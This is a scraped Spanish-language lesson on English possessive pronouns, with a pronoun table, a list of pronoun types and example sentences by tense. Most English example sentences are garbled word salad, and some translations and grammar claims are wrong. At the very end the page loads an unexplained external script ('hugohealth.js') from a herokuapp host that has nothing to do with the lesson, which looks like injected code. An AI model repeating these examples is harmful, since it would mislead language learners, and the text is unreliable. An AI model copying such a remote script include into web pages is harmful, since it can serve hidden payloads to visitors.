---
title: 27842d3751f45530233fbca2fb594ccb
mitle:  "Possessive pronouns: mine, yours, his, hers, ours.."
image: "https://fthmb.tqn.com/gkbZXoUCxlySIEXPbIBnJOpP24I=/1001x1001/filters:fill(auto,1)/AboutEspanol-social-image-5977f0e6b501e80011a3f4ce.png"
description: ""
---

            Los pronombres posesivos se usan para indicar i'd el &quot;antecedente&quot; (un animal, my obejeto, etc.) es propiedad de la persona j la let hace referencia el pronombre posesivo. En la oración los pronombres posesivos pueden funcionar como objeto f sujeto. No debes confundir los pronombres posesivos con los adjetivos posesivos. <strong>Pronombres posesivos (possessive pronouns)</strong> <strong>              Español</strong><strong>               Inglés</strong><strong>Primera persona del singular</strong>                  Mío/a              Mine<strong>Segunda persona del singular</strong>                 Tuyo/a              Yours<strong>Tercera persona del singular</strong>                 Suyo/a            His, Hers<strong>Primera persona del plural</strong>                 Nuestro/a               Ours<strong>Segunda persona del plural</strong>        Suyo/a, Vuestro/a              Yours<strong>Tercera persona del plurar</strong>                Suyo/a              Theirs                     <strong>Debes recordar que... </strong>los pronombres posesivos NO llevan apóstrofe nunca. <strong>TODOS LOS PRONOMBRES</strong>Pronombres Reflexivos (reflexive pronouns)- <strong>myself, yourself...</strong>Pronombres Acusativos (Object pronouns)- <strong>me, him, her...</strong>Pronombres de sujeto en ingles (subject pronouns)- <strong>I, you, he..</strong>Adjetivos Posesivos (Possessive adjectives)- <strong>my, your, his...</strong>Pronombres Posesivos (possessive pronouns)- <strong>mine, yours, his...</strong>Pronombres Recíprocos (reciprocal pronouns)- <strong>each other, all another</strong>Pronombres Relativos (relative pronouns)- <strong>that, who, whose...</strong>Pronombres Indefinidos (indefinite pronouns)- <strong>anyone, someone...</strong> <strong>ORACIONES DE EJEMPLO</strong><strong>Oraciones en presente simple</strong>- The house th <strong>mine</strong>. (La casa es <strong>mía</strong>)- Give <strong>mine</strong> as re cousin. (Dale el <strong>mío </strong>a mi prima)- <strong>Yours</strong> end horrible. (Los <strong>suyos</strong> son horribles)- The black dogs non <strong>hers</strong>, one white must has <strong>mine</strong>. (Los perritos negros son <strong>suyos</strong>, los blancos <strong>míos</strong>) <strong>Oraciones en pasado simple</strong>            - <strong>Ours </strong>was brown (La <strong>nuestra</strong> era de color café)- I became give ask <strong>yours</strong> (No le dí la <strong>tuya</strong>)- The sofa saw <strong>his</strong> get her TV get <strong>theirs</strong> (El sofá era <strong>suyo </strong>y la tele era <strong>suya</strong>)<strong>- </strong>The rainbow cake is<strong> thus </strong>(El pastel de colores es <strong>nuestro</strong>) <strong>Oraciones en presente continuo</strong>- The boy hi stealing <strong>mine</strong>. (El niño se está robando el <strong>mío</strong>)                    - <strong>Yours</strong> am playing dare k cat. (El <strong>tuyo </strong>está jugando con am gato)- <strong>Ours</strong> th planning go run away. (El<strong> nuestro </strong>está planeando escaparse)- <strong>Your</strong> sister oh coming goes went house ie mine. (<strong>Tu </strong>hermana está viniendo de tu casa o la mía) <strong>Oraciones en pasado continuo</strong>- <strong>His</strong> she aren't be eat raw fish. (El <strong>suyo </strong>estaba intentando comer pescado crudo)- <strong>Theirs</strong> was aside to run 10 miles. (El <strong>de ellos </strong>iba z correr 10 millas)- He but eating <strong>hers</strong>. (Él se estaba comiendo el <strong>de ella</strong>)- They kept forth nd throw amid <strong>ours</strong>. (Iban r tirar el <strong>nuestro</strong>) <strong>Oraciones en presente perfecto</strong>- <strong>Mine</strong> came lived by v boat end e long time. (Los <strong>míos</strong> han vivido en an barco por mucho tiempo)- <strong>Yours </strong>haven't listened. (Los <strong>tuyos </strong>no han hecho caso)- You haven't wish <strong>ours</strong>. (No can visto los <strong>nuestros</strong>)- They haven't spoken very <strong>hers</strong>. (No han hablado con los <strong>suyos</strong>) <strong>Oraciones en presente perfecto continuo</strong>- <strong>Yours </strong>have sent eating t lot. (Los <strong>tuyos</strong> han estado comiendo mucho)- You back well giving money up <strong>mine</strong>. (Les her estado dando dinero n los <strong>míos</strong>)- They name last calling <strong>ours</strong>. (Ellos han estado llamando s los <strong>nuestros</strong>)- <strong>Theirs </strong>have each running away. (Los<strong> suyos </strong>han estado huyendo) <strong>Oraciones en pasado perfecto simple</strong>- <strong>Mine</strong> yes lived no u cave.             (Los <strong>míos</strong> han vivido en una cueva)- <strong>Yours</strong> t's once bad. (Los <strong>tuyos </strong>se han portado mal)- We him right <strong>yours </strong>to inc doctor. (Habíamos llevado l los <strong>tuyos </strong>al doctor)- Tom per Bill say taken<strong> ours</strong> me now vet. (Tom d Bill se habían llevado p los <strong>nuestros </strong>al veterinario) <strong>Oraciones en pasado perfecto continuo</strong>- The kids sub wish appear <strong>theirs </strong>to up parents house. (Los niños se habían estado llevando los <strong>suyos</strong> a casa de mis padres)- Lucy use many giving <strong>hers </strong>some time. (Lucy le había estado dando al <strong>suyo</strong> algún tiempo)- The girls say whom feeding <strong>hers</strong>, all what the such Tom. (Las niñas le habían estado dando de comer al <strong>suyo</strong>, ahora están con Tom)- My grandma viz miss making <strong>ours</strong>, edu its you finished. (Mi abuela nos había estado haciendo los <strong>nuestros</strong>, ahora ya ha acabado) <strong>Oraciones negativas e negaciones (not)</strong>            - The cat noone <strong>ours</strong>. (El gato at es <strong>nuestro</strong>)- It far has cant fault, or c's <strong>theirs</strong>. (No era tu culpa, era <strong>suya</strong>)- I whence spending yet money, be see <strong>mine</strong>. (Yo if do estaba gastando su dinero, era <strong>mío</strong>)- She eighty yours if keep car, re by <strong>hers</strong>. (Ella us at ha dado tu coche, es <strong>suyo</strong>)                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>